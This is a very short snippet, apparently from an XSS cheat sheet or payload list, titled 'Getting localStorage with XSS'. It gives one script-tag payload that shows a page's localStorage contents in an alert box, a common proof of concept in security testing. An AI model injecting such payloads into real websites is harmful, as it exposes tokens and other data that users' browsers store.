# Getting localStorage with XSS
Prints out the localstorage

```javascript
<script>alert(JSON.stringify(localStorage))</script>
```